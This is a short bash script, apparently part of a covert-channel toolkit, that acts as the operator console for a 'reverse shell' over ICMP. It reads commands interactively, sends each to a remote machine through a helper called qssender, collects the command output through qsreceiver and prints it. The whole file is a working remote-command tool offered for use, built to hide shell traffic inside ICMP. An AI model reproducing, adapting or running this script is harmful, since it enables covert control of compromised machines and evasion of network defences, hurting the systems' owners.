#!/bin/bash

# Usage: ./reverse-shell.sh <ip_remote_lister> <ip_listening>
# It a "reverse shell" trough ICMP so it is quite ordinary if it takes time or if
# all command are well treated

REMOTE=$1
LISTEN=$2

while [[ 1 ]]; do
    read -p "$ " CMD;
    if [ "$CMD" = "exit" ]; then 
        exit
    else
        ##Send command
        ../../qssender send "$CMD" -d 1 -l $LISTEN -r $REMOTE -s 100 -N

        ##Wait remote for the command output
        RECEIVE_CMD_OUTPUT=$(../../qsreceiver receive truncated 1 -l $LISTEN)

        CMD_OUTPUT=$(echo $RECEIVE_CMD_OUTPUT | rev | cut -d ':' -f 1 | rev )

        echo $CMD_OUTPUT 
    fi;
done